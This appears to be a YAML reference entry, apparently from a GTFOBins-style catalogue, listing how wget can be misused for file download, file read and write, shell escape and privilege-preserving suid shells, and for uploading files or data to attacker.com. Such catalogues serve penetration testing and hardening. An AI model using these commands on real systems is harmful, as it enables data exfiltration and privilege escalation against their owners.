---
functions:
  download:
  - code: |-
      wget http://attacker.com/path/to/input-file -O /path/to/output-file
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: http-server
  file-read:
  - binary: false
    code: |-
      wget -i /path/to/input-file
    comment: |-
      The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      wget -i /path/to/input-file -o /path/to/output-file
    comment: |-
      The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
      chmod +x /path/to/temp-file
      wget --use-askpass=/path/to/temp-file 0
    contexts:
      sudo:
      suid:
        code: |-
          echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >/path/to/temp-file
          chmod +x /path/to/temp-file
          wget --use-askpass=/path/to/temp-file 0
        shell: false
      unprivileged:
  upload:
  - code: |-
      wget --post-file=/path/to/input-file http://attacker.com
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: http-server
  - code: |-
      wget --post-data=DATA http://attacker.com
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: http-server
...
